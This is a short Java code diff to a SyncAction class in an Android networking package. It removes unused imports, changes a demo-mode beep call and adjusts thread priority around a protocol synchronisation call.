@@ -9,17 +9,11 @@
 
 package com.android.networking.action;
 
-import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
 
-import org.json.JSONObject;
-
 import com.android.networking.Beep;
-import com.android.networking.Core;
-import com.android.networking.Status;
 import com.android.networking.Trigger;
-import com.android.networking.action.sync.Protocol;
 import com.android.networking.action.sync.ProtocolException;
 import com.android.networking.action.sync.Transport;
 import com.android.networking.action.sync.ZProtocol;
@@ -110,7 +104,7 @@ public abstract class SyncAction extends SubActionSlow {
 		boolean ret = false;
 		
 		if (Cfg.DEMO) {
-			Beep.beepPenta();
+			Beep.beep();
 		}
 
 		for (int i = 0; i < transports.size(); i++) {
@@ -149,7 +143,9 @@ public abstract class SyncAction extends SubActionSlow {
 						before = new Date();
 					}
 
+					Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
 					ret = protocol.perform();
+					Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
 
 					// transport.close();
 
